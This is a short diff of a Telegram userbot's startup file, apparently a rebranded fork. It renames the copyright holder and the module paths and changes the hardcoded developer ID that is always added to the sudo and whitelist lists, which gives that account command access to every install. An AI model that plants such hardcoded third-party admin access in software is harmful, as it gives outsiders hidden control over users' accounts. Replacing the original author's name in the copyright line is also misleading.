@@ -1,4 +1,4 @@
-# Copyright (C) 2021 FaridDadashzade.
+# Copyright (C) 2021 RustAdmins.
 # Licensed under MIT license;
 # you may not use this file except in compliance with the License.
 # All rights reserved.
@@ -36,9 +36,9 @@ if version_info[0] < 3 or version_info[1] < 6:
     exit(1)
 
 if bool(os.environ.get("ENV", False)):
-    from CyberPro.sample_config import Config
+    from Rustify.sample_config import Config
 else:
-    from CyberPro.config import Development as Config
+    from Rustify.config import Development as Config
     
 class rustasistan(Client):
 	def __init__(self):
@@ -62,8 +62,8 @@ SUDO_VERSION = "1.0"
 
 # Whitelist və Patterns
 PATTERNS = "."
-DEVS = [1527722982, 979515849]
-WHITELIST = [1527722982, 979515849]
+DEVS = [1527722982, 1201983529]
+WHITELIST = [1527722982, 1201983529]
 COMMAND_HAND_LER = Config.COMMAND_HAND_LER
 MAX_MESSAGE_LENGTH = Config.MAX_MESSAGE_LENGTH
 
@@ -112,7 +112,7 @@ G_DRIVE_CLIENT_SECRET = Config.G_DRIVE_CLIENT_SECRET
 
 # Sudo
 SUDO_USERS = list(Config.SUDO_USERS)
-SUDO_USERS.append(1527722982)
+SUDO_USERS.append(1201983529)
 SUDO_USERS = list(set(SUDO_USERS))
 
 try:
